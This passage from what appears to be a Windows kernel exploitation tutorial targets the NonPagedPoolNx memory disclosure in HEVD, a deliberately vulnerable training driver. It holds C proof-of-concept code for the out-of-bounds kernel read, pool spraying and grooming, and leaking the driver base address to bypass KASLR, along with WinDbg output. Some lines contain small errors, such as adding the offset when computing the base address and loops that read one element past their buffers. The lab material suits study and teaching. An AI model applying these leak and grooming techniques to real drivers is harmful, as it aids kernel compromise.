that existed in user-land. However as of the 19H1 Windows 10 release this has changed and the well documented Segmeant Heap from user-land has been brought into the kernel. In this post we will be exploring the old pool, i.e, we won't be looking at the Segment Heap internals since we're on RS4 and as mentioned the Segment Heap from user-land was not brought into the kernel until 19H1.</p>  Note <p>As a quick aside the reason why I am not looking at the Segment Heap implementation is because I've never interacted with the Pool prior to this post so we're starting somewhat at the beginning. You might be wondering why I am not doing this on Windows 7 x86 in that case and the reason is simple - there's a million posts on that, you won't learn anything new from me on those builds. But you might on Windows 10 x64.</p>  <p>The kernel pools are divided into four distinct types which are held in the <code>_POOL_DESCRIPTOR</code> structure with a type of <code>POOL_TYPE</code>:</p> <ul> <li>Paged</li> <li>NonPaged</li> <li>NonPagedNx</li> <li>Session</li> </ul> <p>The Pool Descriptor keeps information on the current state of the pool including the pool type as mentioned, its typedef can be seen below.</p> <pre><code>typedef struct _POOL_DESCRIPTOR {\n    POOL_TYPE  PoolType;\n    ULONG      PoolIndex;\n    ULONG      RunningAllocs;\n    ULONG      RunningDeAllocs;\n    ULONG      TotalPages;\n    ULONG      TotalBigPages;\n    ULONG      Threshold;\n    PVOID      LockAddress;\n    LIST_ENTRY ListHeads[POOL_LIST_HEADS];\n\n} POOL_DESCRIPTOR; *PPOOL_DESCRIPTOR*;\n</code></pre> <p>Each allocation is identified using a Pool Tag which is a four-byte character array that is specified by the driver when it allocates the memory using a call to <code>ExAllocatePoolWithTag</code>. The Pool Tag can ultimately be anything as long as each character is ASCII.</p> <p>In essence the pool is simply just a list of allocated memory pages. Each page is 0x1000 bytes in size and is fragmented in chunks. Chunks can be different sizes however in our case we'll only focus on chunks smaller than 0xFF1 bytes. Below is the structure of a pool chunk:</p> <pre><code>   |---------------------------------------------------|\n0  | PreviousSize | PoolIndex | Block Size | Pool Type |\n4  |---------------------------------------------------|\n   |                      Pool Tag                     |\n8  |---------------------------------------------------|\n   |                                                   |\n   |                   Process Billed                  |\n   |                                                   |\n16 |---------------------------------------------------|\n   |                                                   |\n   |                                                   |\n   |                       Data                        |\n   |                                                   |\n   |                                                   |\n   |---------------------------------------------------|\n</code></pre> <p>As noted the primary API for pool allocations is <code>ExAllocatePoolWithTag</code>. The prototype for <code>ExAllocatePoolWithTag</code> can be seen below:</p> <pre><code>PVOID ExAllocatePoolWithTag(\n    POOL_TYPE   PoolType,\n    SIZE_T      NumberOfBytes,\n    ULONG       Tag\n);\n</code></pre> <p>Drawing a comparison between user-land and kernel-land for a second, in user-land developers have the default process heap to allocate chunks from. Alternatively they can create their own private heaps. The Windows Pool is different as the system predefines the pools for servicing requests in the kernel, i.e, through pool types which have distinct properties.</p> <p>We won't be talking about the Paged or Session Pool here as these are out of scope for this post. Instead we will focus on the NonPagedNx Pool. We could talk in much more detail about the pool however this is ultimately out of the scope of this post.</p>","title":"Memory Pool"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#nonpagednx-pool","tags":["windows-kernel-exploitation"],"text":"<p>Since Windows 8 a new pool type called the NonPagedNx pool was released, although it operates on the same paging principle as the original NonPaged Pool it has some additional security properties the most obvious one being \"Non-eXecutable\" (NX). In a later post we will exploit a pool overflow in the NonPagedNx pool but for now we're going to swim in the shallow end and build a basic understanding that we can leverage in future posts for more cool hax.</p>","title":"NonPagedNx Pool"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#reversing-the-driver","tags":["windows-kernel-exploitation"],"text":"<p>As in previous posts the <code>IrpDeviceIoCtlHandler</code> is located at <code>sub_140085078</code>. To find the vulnerable functions IOCTL handler we can just do a string search for the words \"Memory Disclosure\" which should take us to the address <code>loc_140085487</code> which has the IOCTL handler for the vulnerable NonPagedPoolNx Memory Disclosure function.</p>","title":"Reversing the Driver"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#locating-the-ioctl-handler","tags":["windows-kernel-exploitation"],"text":"<p>At <code>IrpDeviceIoCtlHandler+42E</code> is a call to the IOCTL handler which we'll rename to <code>MemoryDisclosureNonPagedPoolNxIoctlHandler</code>.</p>","title":"Locating the IOCTL Handler"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#reversing-the-vulnerable-function","tags":["windows-kernel-exploitation"],"text":"<p>Inside <code>MemoryDisclosureNonPagedPoolNxIoctlHandler</code> at <code>MemoryDisclosureNonPagedPoolNxIoctlHandler+15</code> there is a call to the trigger of the vulnerable function, we'll rename this to <code>TriggerMemoryDisclosureNonPagedPoolNx</code>. Let's open the function in IDA.</p>  Hint <p>The below decompilation has been cleaned up and modified so your IDA output won't be identical!</p>  Vulnerable Function<pre><code>TriggerMemoryDisclosureNonPagedPoolNx(volatile void *UserBuffer, SIZE_T UserSize)\n{\n  PVOID KernelBuffer;\n  int64 result;\n\n  DbgPrintEx(0x4D, 3, \"[+] Allocating Pool chunk\\n\");\n  KernelBuffer = ExAllocatePoolWithTag((POOL_TYPE)512, 0x1F8, 0x6B636148);\n\n  if ( KernelBuffer )\n  {\n    DbgPrintEx(0x4D, 3, \"[+] Pool Tag: %s\\n\", \"'kcaH'\");\n    DbgPrintEx(0x4D, 3, \"[+] Pool Type: %s\\n\", \"NonPagedPoolNx\");\n    DbgPrintEx(0x4D, 3, \"[+] Pool Size: 0x%X\\n\", 504);\n    DbgPrintEx(0x4D, 3, \"[+] Pool Chunk: 0x%p\\n\", KernelBuffer);\n\n    memset(KernelBuffer, 65, 0x1F8);\n    ProbeForWrite(UserBuffer, 0x1F8, 1);\n\n    DbgPrintEx(0x4D, 3, \"[+] UserOutputBuffer: 0x%p\\n\", UserBuffer);\n    DbgPrintEx(0x4D, 3, \"[+] UserOutputBuffer Size: 0x%X\\n\", UserSize);\n    DbgPrintEx(0x4D, 3, \"[+] KernelBuffer: 0x%p\\n\", KernelBuffer);\n    DbgPrintEx(0x4D, 3, \"[+] KernelBuffer Size: 0x%X\\n\", 504);\n    DbgPrintEx(0x4D, 3, \"[+] Triggering Memory Disclosure in NonPagedPoolNx\\n\");\n\n    RtlCopyMemory(UserBuffer, KernelBuffer, UserSize);\n\n    DbgPrintEx(0x4D, 3, \"[+] Freeing Pool chunk\\n\");\n    DbgPrintEx(0x4D, 3, \"[+] Pool Tag: %s\\n\", \"'kcaH'\");\n    DbgPrintEx(0x4D, 3, \"[+] Pool Chunk: 0x%p\\n\", KernelBuffer);\n    ExFreePoolWithTag(KernelBuffer, 0x6B636148);\n    result = 0;\n  }\n  else\n  {\n    DbgPrintEx(0x4D, 3, \"[-] Unable to allocate Pool chunk\\n\");\n    result = 3221225495;\n  }\n  return result;\n}\n</code></pre> <p>Starting from the top of the function we can see that there's a pool allocation through the <code>ExAllocatePoolWithTag</code> function which passes three parameters:</p> <ol> <li>A <code>POOL_TYPE</code> of 512 (which is NonPagedPoolNx)</li> <li>A size of the allocation which is <code>0x1F8</code> </li> <li>A Pool tag which is represented in hex <code>0x6B636148</code></li> </ol> <p>Based on the print statements following the allocation we know that the final argument in the call to <code>ExAllocatePoolWithTag</code> is <code>kcaH</code> which is <code>Hack</code> reversed.</p> <p>Moving down the function we can see there's a call to <code>memset()</code> which sets the allocated Pool buffer to be filled with <code>65</code> which is <code>0x41</code> in hex (<code>A</code> characters). And that memset uses the same size that was used for the total allocation, i.e, it sets the entire allocated buffer to be filled with <code>A</code>.</p> <p>Directly after the call to <code>memset()</code> there is a call to <code>ProbeForWrite()</code> which we know from previous posts does a write from a user-mode buffer stored at <code>Address</code>. We can see that the write uses the same size that was used for the pool buffer, so far no vulnerabilities here.</p> <p>If we move down past the prints we can see there's a call to <code>RtlCopyMemory</code> (<code>memcpy</code>) which copies the contents of the allocated pool buffer into the user-mode address. The final argument is the size argument and here is where the problem is. If we look at the top of the function we can see that <code>TriggerMemoryDisclosureNonPagedPoolNx</code> takes two arguments, a pointer to a user-mode buffer and a <code>SIZE_T</code> arugment (which is also controlled by us.) Then when we get to the <code>RtlCopyMemory</code> instead of using the same size that was used to allocate the pool buffer, it uses the size specified by the user in the call to <code>TriggerMemoryDisclosureNonPagedPoolNx</code>. This is a classic information leak vulnerability.</p> <p>Since we control the size parameter for the copy, we can leak data from adjacent pool chunks which can include kernel addresess and more.</p>","title":"Reversing the Vulnerable Function"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#dynamic-analysis","tags":["windows-kernel-exploitation"],"text":"<p>Now that we've done some static analysis let's set a breakpoint on <code>TriggerMemoryDisclosureNonPagedPoolNx</code> in WinDbg and step through the function to confirm the behaviour that we've seen so far. </p>","title":"Dynamic Analysis"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#interacting-with-the-driver","tags":["windows-kernel-exploitation"],"text":"<p>To aid the dynamic analysis process we'll create a simple program to interact with the driver. Most of this code will be familiar to you from previous posts so I won't explain all of it here again.</p> Simple Interaction Program<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Psapi.h&gt;\n\n#define DRIVER \"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\"\n#define IOCTL_CODE 0x0022204f\n\n/* Function to open a handle to the driver */\nHANDLE OpenDriverHandle()\n{\n    HANDLE DriverHandle = NULL;\n\n    /* Opens handle to driver */\n    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (DriverHandle == INVALID_HANDLE_VALUE) // If handle cant open, exit.\n    {\n        printf(\"\\t[!] FATAL: Failed to open driver handle!\\n\");\n        exit(-1);\n    }\n    else\n    {\n        printf(\"\\t[+] Opened Driver Handle: 0x%x\\n\", DriverHandle);\n        return DriverHandle; // Return handle to driver to be used later.\n    }\n}\n\nvoid exploit(HANDLE DriverHandle)\n{\n\n    DWORD   BytesReturned;\n    BYTE    OutputBuffer[0x1F8] = {0};\n\n    /* Issue IOCTL */\n    printf(\"[*] Sending IOCTL to driver!\\n\");\n    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &amp;OutputBuffer, 0x1F8, &amp;BytesReturned, NULL)) // (1)\n    {\n        printf(\"[!] FATAL: Error sending IOCTL to driver!\\n\");\n        return;\n    }\n\n    printf(\"[+] Kernel Allocation Contents: \");\n    for (int i = 0; i &lt;= 0x1F8; i++)\n    {\n        printf(\"%x\", OutputBuffer[i]);\n    }\n\n}\n\nint main()\n{\n    printf(\"[+] HEVD: NonPagedPoolNx Memory Disclosure!\\n\");\n\n    printf(\"[*] Opening handle to the driver!\\n\");\n    HANDLE DriverHandle = OpenDriverHandle();\n\n    exploit(DriverHandle);\n}\n</code></pre> <ol> <li>Notice how we use <code>lpOutBuffer</code> and <code>nOutBufferSize</code> here since we're doing a <code>read()</code> rather than a <code>write()</code>.</li> </ol> <p>The important thing to take note of here is the call to <code>DeviceIoControl</code> before moving onwards with our analysis let's quickly take a look at the prototype from MSDN.</p> DeviceIoControl Prototype<pre><code>BOOL DeviceIoControl(\n  [in]                HANDLE       hDevice,\n  [in]                DWORD        dwIoControlCode,\n  [in, optional]      LPVOID       lpInBuffer,\n  [in]                DWORD        nInBufferSize,\n  [out, optional]     LPVOID       lpOutBuffer,\n  [in]                DWORD        nOutBufferSize,\n  [out, optional]     LPDWORD      lpBytesReturned,\n  [in, out, optional] LPOVERLAPPED lpOverlapped\n);\n</code></pre> <p>In previous posts we've heavily used the <code>lpInBuffer</code> and <code>nInBufferSize</code> arguments whereas for this exploit we're actually going to need to use the <code>lpOutBuffer</code> and <code>nOutBufferSize</code> arguments, which you can see in our above simple program. If we compile and run the code we should see some output like shown below.</p> Basic POC<pre><code>C:\\Users\\admin\\Desktop&gt;NonPagedPoolNxMemoryDisclosure.exe\n[+] HEVD: NonPagedPoolNx Memory Disclosure!\n[*] Opening handle to the driver!\n        [+] Opened Driver Handle: 0x7c\n[*] Sending IOCTL to driver!\n[+] Kernel Allocation Contents: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410\n</code></pre> <p>As you can clearly see, we are able to read data from the allocated kernel buffer since we're receiving the <code>A</code> characters which we know are the result of a <code>memset()</code> the function does.</p>","title":"Interacting with the Driver"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#exploitation","tags":["windows-kernel-exploitation"],"text":"<p>Exploitation of this vulnerability is fairly simple, we can make a request for more data than the allocated pool chunk of 0x1F8 has. Let's make a minor modification to our exploit code and request 0x1F8 * 2 which is 0x3F0. You can find the changes to the POC below.</p> Exploit Attempt<pre><code>void exploit(HANDLE DriverHandle)\n{\n\n    DWORD   BytesReturned;\n    BYTE    OutputBuffer[0x3F0] = {0};\n\n    /* Issue IOCTL */\n    printf(\"[*] Sending IOCTL to driver!\\n\");\n    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &amp;OutputBuffer, 0x3F0, &amp;BytesReturned, NULL))\n    {\n        printf(\"[!] FATAL: Error sending IOCTL to driver!\\n\");\n        return;\n    }\n\n    printf(\"[+] Kernel Allocation Contents: \");\n    for (int i = 0; i &lt;= 0x3F0; i++)\n    {\n        printf(\"%x\", OutputBuffer[i]);\n    }\n\n}\n</code></pre>  Hint <p>The <code>A</code> characters have been removed from the output below for brevity.</p>  Leaking Data :smile:<pre><code>C:\\Users\\admin\\Desktop&gt;NonPagedPoolNxMemoryDisclosure.exe\n[+] HEVD: NonPagedPoolNx Memory Disclosure!\n[*] Opening handle to the driver!\n        [+] Opened Driver Handle: 0x7c\n[*] Sending IOCTL to driver!\n[+] Kernel Allocation Contents: 0000000021019246696c6572bc4a5ecf769d45889afeae689ffff4899feae689ffff04008010000000000000000006099feae689ffff000000000000689ffff10000000000000000000000006f04c401100405c47853f8ffff0000000050d80000070ec4dac689ffffe0b64dac689ffff904617ba8daefffff04817ba8daeffffc8e0f8ae689ffff0000000000000000000000000010010042404000005207800000a0bbc6b98daeffff00000000000000000000000010600000389afeae689ffff389afeae689ffff00600000509afeae689ffff509afeae689ffff0000000000000000709afeae689ffff709afeae689ffff000000000000000000000000000000001000000000000000000000000000000019019246696c6582bf4a5ecf769d45189cfeae689fffff08d50ac689ffffd8000801000000000000000000000000000000000000000000210000000000000000\n</code></pre> <p>As you can see in the above output, it is pretty clear that we are able to leak arbitrary data from adjacent pool chunks. The next step though is how we turn this data into something useful.</p>","title":"Exploitation"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#leaking-driver-addresses","tags":["windows-kernel-exploitation"],"text":"<p>Our current POC is simply leaking data from the adjacent pool chunks, while this could certainly be useful there is more we can do with this. For starters, it would be nice to leak the base address of the driver. We should be able to do this very easily.</p> <p>In order to leak addresses we actually want such as the base address of HEVD for example, we're going to need to carry out the process of \"pool grooming\". All this term really means is; getting the pool into a state which is desirable to us, the attacker. Pool grooming is a very well understood concept and there's a number of ways we can approach it. The most common way to perform grooming of the pool is to do lots of allocations of Kernel Objects such as the Event Object for example. With that in mind, let's go ahead and create a new function in our POC to spray some Kernel Objects.</p> Pool Spray Function<pre><code>void PoolSpray()\n{\n    HANDLE  EventObjects[10000] = {0};\n\n    for (int i = 0; i &lt;= 10000; i++)\n    {\n        HANDLE EventHandle = CreateEventA(NULL, FALSE, FALSE, NULL);\n\n        EventObjects[i] = EventHandle;\n    }\n}\n</code></pre> <p>The above function is a very simple pool spray which we can use to fulfil our goal of grooming the pool. We create an array called <code>EventObjects</code> which can store 10,000 event object handles. Then inside a for loop we create 10,000 event objects. Finally we make sure to pass those returned handles to our array so that we can use them later.</p>","title":"Leaking Driver Addresses"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#inspecting-the-pool","tags":["windows-kernel-exploitation"],"text":"<p>With the new function we just created, let's set a breakpoint after the pool allocation and inspect the state of the pool.</p> <pre><code>0: kd&gt; bp HEVD!TriggerMemoryDisclosureNonPagedPoolNx+59\n0: kd&gt; g\n\nBreakpoint 1 hit\nHEVD!TriggerMemoryDisclosureNonPagedPoolNx+0x59:\nfffff800`4a8c6f5d 488bf8          mov     rdi,rax\n\n0: kd&gt; r\nrax=ffff8700c6f662c0 rbx=0000000000000000 rcx=0000000000000010\nrdx=0000000000000bd7 rsi=00000086857ff260 rdi=000000000000004d\nrip=fffff8004a8c6f5d rsp=fffff90f1ae82760 rbp=ffff8700c61d27f0\n r8=ffff8700c3600000  r9=0000000000000000 r10=000000006b636148\nr11=0000000000001001 r12=000000000000004d r13=00000000000001f8\nr14=00000000000003f0 r15=0000000000000003\niopl=0         nv up ei ng nz na pe nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282\nHEVD!TriggerMemoryDisclosureNonPagedPoolNx+0x59:\nfffff800`4a8c6f5d 488bf8          mov     rdi,rax\n</code></pre> <p>What we should see is that our sprayed objects are filling the pool. We can use the <code>!poolused</code> command in order to find the number of allocations of specific events in this case we're interested in Events which can be found via their <code>POOL_TAG</code> of <code>Even</code>.</p> <pre><code>0: kd&gt; !poolused 2 Even\n\n               NonPaged                  Paged\n Tag     Allocs         Used     Allocs         Used\n\n Even     19248      2470752          0            0    Event objects \n\nTOTAL     19248      2470752          0            0\n</code></pre> <p>As you can see in the above, we've successfully managed to allocate some objects in the NonPaged Pool of our choosing. The address of the pool allocation is returned in <code>RAX</code> and we can use the <code>!pool</code> command to inspect that pool page.</p> <pre><code>0: kd&gt; !pool ffff8700c6f662c0\nPool page ffff8700c6f662c0 region is Nonpaged pool\n ffff8700c6f66000 size:   80 previous size:    0  (Allocated)  Even\n ffff8700c6f66080 size:  230 previous size:   80  (Free)       Free\n*ffff8700c6f662b0 size:  210 previous size:  230  (Allocated) *Hack\n        Owning component : Unknown (update pooltag.txt)\n ffff8700c6f664c0 size:   80 previous size:  210  (Free )  Io  \n ffff8700c6f66540 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f665e0 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66660 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66700 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66780 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66820 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f668a0 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66940 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f669c0 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66a60 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66ae0 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66b80 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66c00 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66ca0 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66d20 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66dc0 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66e40 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66ee0 size:   80 previous size:   80  (Allocated)  Even\n ffff8700c6f66f60 size:   80 previous size:   80  (Allocated)  Even\n</code></pre> <p>As you can see our objects are clearly present and between our allocations of objects. Remember the primitive is that we can read data from adjacent pool chunks. In the above, the chunk next to ours is actually in a free state, i.e, we don't control this chunk. But the subsequent chunks we do. In order to read the data we desire, we need to make sure that the adjacent pool chunks are filled with data which we control. </p> <p>Now that we are able to control the pool page to a reliable degree we can begin our next task. As stated previously our goal is to leak addresses which we can use for future payloads such as when we need to bypass KASLR if we're in a low integrity environment. With the memory disclosure we currently have we're not leaking anything that useful. Now that we can control the pool page though we can leak something more interesting.</p> <p>If we zoom out for a bit and take a look at some of the available functions in HEVD we'll notice that there are some functions which are designed to allocate objects in the NonPagedNx Pool. This is ideal because we can use these objects in our pool spray so that when we execute our read primitive we're actually reading an object created by the driver which should give us an address inside the driver itself which we can then use to calculate the base address of the driver.</p>  Attention <p>It is worth noting here that this primitive isn't entirely realistic. There would be some differences with a real driver but for the most part it is accurate.</p>","title":"Inspecting the Pool"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#leaking-a-function-pointer","tags":["windows-kernel-exploitation"],"text":"<p>The above explanation was a bit of a word salad so lets break it down. Our goal is to leak an address which we can use in further exploitation, ideally it would be nice to have a primitive to get the base address of HEVD. HEVD comes with some \"helper\" functions which are specifically created to help with exploitation of some of the other exploit primitives.</p> <p>These \"helper\" functions allocate objects in the NonPagedNx Pool to be used for exploitation of other vulnerabilities in HEVD. For example, there is a function to allocate a fake object in the NonPagedPoolNx for the UaF primitive this function is called <code>AllocateUaFObjectNonPagedPoolNx</code>. This function is very simple, it does an allocation similar to the one that we observed in our vulnerable function. So how can we use it?</p> <p>At the moment we have control of the pool, we can allocate objects sequentially without an issue which gives us reliable control over the pool. However, in order to get an address we can actually use for further exploitation we'll need to adapt our payload. Since we have a function which is able to make an allocation in the NonPagedNx Pool we can use this function to leak an address from HEVD. If we perform our standard pool spray but then issue an IOCTL to the <code>AllocateUaFObjectNonPagedPoolNx</code> function, that function will create an object in the NonPagedNx Pool. If we can make it such that the allocated object lands between our sprayed objects we'll then be able to use our leak primitive to leak addresses from the chunk created by <code>AllocateUaFObjectNonPagedPoolNx</code> which should allow us to calculate the base address of HEVD.</p> <p>We'll modify our existing spray and add a <code>DeviceIoControl</code> to call the <code>AllocateUaFObjectNonPagedPoolNx</code> function during our spray. What should happen is that objects from that function should land after every single Event Object.</p> <pre><code>#define IOCTL_UAF 0x00222053\n\nvoid PoolSpray(DriverHandle)\n{\n    HANDLE  EventObjects[10000] = {0};\n    DWORD   BytesReturned;\n\n    for (int i = 0; i &lt;= 10000; i++)\n    {\n        HANDLE EventHandle = CreateEventA(NULL, FALSE, FALSE, NULL);\n\n        DeviceIoControl(DriverHandle, IOCTL_UAF, NULL, 0, NULL, 0, &amp;BytesReturned, NULL);\n\n        EventObjects[i] = EventHandle;\n    }\n\n}\n</code></pre> <p>Let's now run our updated payload and inspect the state of the pool. We'll use the same breakpoint we used previously and then get the pool address from the <code>RAX</code> register.</p> <pre><code>1: kd&gt; !pool ffff8700c77278c0\nPool page ffff8700c77278c0 region is Nonpaged pool\n ffff8700c7727000 size:   70 previous size:    0  (Allocated)  Hack\n ffff8700c7727070 size:  840 previous size:   70  (Free)       Free\n*ffff8700c77278b0 size:  210 previous size:  840  (Allocated) *Hack\n        Owning component : Unknown (update pooltag.txt)\n ffff8700c7727ac0 size:   80 previous size:  210  (Free )  Io  \n ffff8700c7727b40 size:   80 previous size:   80  (Free )  Io  \n ffff8700c7727bc0 size:   80 previous size:   80  (Allocated)  Io   Process: ffff8700c6f2e580\n ffff8700c7727c40 size:   70 previous size:   80  (Allocated)  Hack\n ffff8700c7727cb0 size:   80 previous size:   70  (Allocated)  Even\n ffff8700c7727d30 size:   70 previous size:   80  (Allocated)  Hack\n ffff8700c7727da0 size:   80 previous size:   70  (Allocated)  Even\n ffff8700c7727e20 size:   70 previous size:   80  (Allocated)  Hack\n ffff8700c7727e90 size:   80 previous size:   70  (Allocated)  Even\n ffff8700c7727f10 size:   70 previous size:   80  (Allocated)  Hack\n ffff8700c7727f80 size:   80 previous size:   70  (Allocated)  Even\n</code></pre> <p>As you can clearly see, after every event object we have a <code>Hack</code> object as well, this is perfect. We can now use our arbitrary size information leak to leak addresses from the adjacent chunks. What we'd like to do next is replace those created <code>Even</code> objects with the vulnerable object that features the out-of-bounds read. The desired end result of the pool looks like this.</p> <pre><code>VULN_OBJ | UAF_OBJ | VULN_OBJ | UAF_OBJ | [...]\n</code></pre> <p>To achieve this goal we can make some minor modifications to our existing payload. We'll need to free our Event Objects so that our pool structure looks like below:</p> <pre><code>FREE | UAF_OBJ | FREE | UAF_OBJ | [...]\n</code></pre> <p>We can simply issue a call to <code>CloseHandle()</code> on all of the event objects because almost immediately after we'll begin spraying the vulnerable objects and at least one of them should be adjacent to a <code>Hack</code> chunk thus giving us our read primitive.</p> Freeing the Event Objects<pre><code>    /* Free event objects */\n    for (int i = 0; i &lt;= 5000; i++)\n    {\n        CloseHandle(EventObjects[i]);\n        EventObjects[i] = NULL;\n    }\n</code></pre> <p>With those objects being freed we can go ahead and spray 100 of our vulnerable objects, this is a simple case of creating a loop in our <code>exploit()</code> function. The reason why we're not going to replace all of the Event objects with vulnerable objects is because we need to ensure that we don't try and read too far out-of-bounds because that could cause a page fault which will generate a BSOD. Also, 100 vulnerable objects should be enough to get a reliable leak.</p> Spray 100 vulnerable objects<pre><code>void exploit(HANDLE DriverHandle)\n{\n\n    DWORD           BytesReturned;\n    char            OutputBuffer[0x270] = {0};\n    ULONGLONG       HevdBaseAddress;\n\n    printf(\"[+] Starting pool spray!\\n\");\n    for (int i = 0; i &lt;= 100; i++)\n    {\n        PoolSpray(DriverHandle);\n        DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &amp;OutputBuffer, sizeof(OutputBuffer), &amp;BytesReturned, NULL);\n    }\n}\n</code></pre> <p>If we run the code above we're going to get a lot of junk data out that has no relation at all to our target object. We'll get lots of addresses which are not useful to us at all. </p>","title":"Leaking a Function Pointer"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#improving-reliability","tags":["windows-kernel-exploitation"],"text":"<p>As with any exploit the goal is reliability, this is especially important with information leaks because we want to be sure the address we are leaking is the address we think it is. Unfortunately, we're fighting the allocator here a little, but we can account for that in our POC. We can't guarantee with 100% certaintity that we will leak the call back address in the HEVD UAF helper function every time, but we can implement some checks so that our leak runs until we're sure we've found it.</p> <p>To do this we can implement some simple checks into our spray which can verify some of the received leaked data. Particularly we can do two things:</p> <ol> <li>Check for the presence of the <code>Hack</code> pool tag.</li> <li>Verify the leaked address is a kernel address.</li> </ol> <p>The first check is more reliable than the latter check, so we'll perform that check first and once we confirm the pool tag is present in the received data, we'll check for kernel addresses. When we leak data we'll be leaking the pool chunks header which contains the pool tag. By checking the leaked data for the presence of the pool tag we know is used in the UaF helper object we can confirm that the leak on that iteration did in-fact leak a chunk belonging to the driver.</p> <pre><code>void exploit(HANDLE DriverHandle)\n{\n    DWORD           BytesReturned;\n    char            OutputBuffer[0x270] = {0};\n    ULONGLONG       HevdBaseAddress;\n\n    char search[5] = \"Hack\";\n    int pos_search = 0;\n    int pos_text = 0;\n    int len_search = 4;\n    int len_text = 0x270;\n    BOOL Match = FALSE;\n\n    printf(\"[+] Starting pool spray!\\n\");\n    for (int i = 0; i &lt;= 100; i++)\n    {\n        PoolSpray(DriverHandle);\n        DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &amp;OutputBuffer, sizeof(OutputBuffer), &amp;BytesReturned, NULL);\n\n        for (pos_text = 0; pos_text &lt; len_text - len_search; ++pos_text)\n        {\n            if (OutputBuffer[pos_text] == search[pos_search])\n            {\n                ++pos_search;\n                if (pos_search == len_search)\n                {\n                    printf(\"\\t[!] Match from %d to %d\\n\", pos_text-len_search, pos_text);\n                    Match = TRUE;\n                    break;\n                }\n            }\n            else\n            {\n                pos_text -= pos_search;\n                pos_search = 0;\n            }\n        }\n\n        if (Match == TRUE)\n        {\n            for (int i = 0; i &lt;= 0x270; i++)\n            {\n                unsigned long long *UOutputBuffer;\n                UOutputBuffer = (unsigned long long *)OutputBuffer;\n                //printf(\"0x%llx\\n\", UOutputBuffer[i]);\n\n                /* Check if we leaked kernel address */\n                if ((UOutputBuffer[i] &amp; 0xfffff00000000000) == 0xfffff00000000000)\n                {\n                    printf(\"\\t[+] Address of HEVD!UaFObjectCallback: 0x%llx\\n\", UOutputBuffer[i]);\n                    printf(\"\\t[+] Base Address of HEVD: 0x%llx\\n\", UOutputBuffer[i] - 0x880C0);\n\n                    // 0: kd&gt; ? 0xfffff8051b3880c0 - HEVD\n                    // Evaluate expression: 557248 = 00000000`000880c0\n                    HevdBaseAddress = UOutputBuffer[i] + 0x880C0;\n                    break;\n                }\n            }\n            break;\n        }\n    }\n    printf(\"[*] Closing handle!\\n\");\n    CloseHandle(DriverHandle);\n</code></pre> <p>The code probably looks quite daunting so I'll do my best to explain it. From a high level it is quite simple. We spray the pool with 100 of the vulnerable chunks that we're able to perform the out-of-bounds read with. We'll then iterate over the received buffer and search for the string \"Hack\", if we find this string then we'll loop over all of the characters in the array and we'll check if they are compliant with the kernel address format, if they are since the pool tag was found we can be sure that we found the an address inside HEVD and we can then calculate the base address.</p> <p>If you're unfamiliar with C I would suggest taking a great deal of care to read over the code and understand what exactly we're doing. Or you could just use Python because it has the <code>in()</code> function which is much easier... If you're really stuck with understanding the above code specifically iterating over the character array, I got most of that from this stackoverflow post.</p>","title":"Improving Reliability"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#final-result","tags":["windows-kernel-exploitation"],"text":"<p>As you can see in the above code block all our effort paid off and we're now able to leak the base address of HEVD. It is worth noting that it won't leak every time, you may have to run the code more than once. This could easily be solved by changing the loop logic but I won't bother with that in this post. 90% of the time you'll get the base address within 1 or 2 executions of the exploit.</p> <pre><code>0: kd&gt; lm m hevd\nBrowse full module list\nstart             end                 module name\nfffff800`c46e0000 fffff800`c476c000   HEVD       (deferred)             \n\nUnable to enumerate user-mode unloaded modules, Win32 error 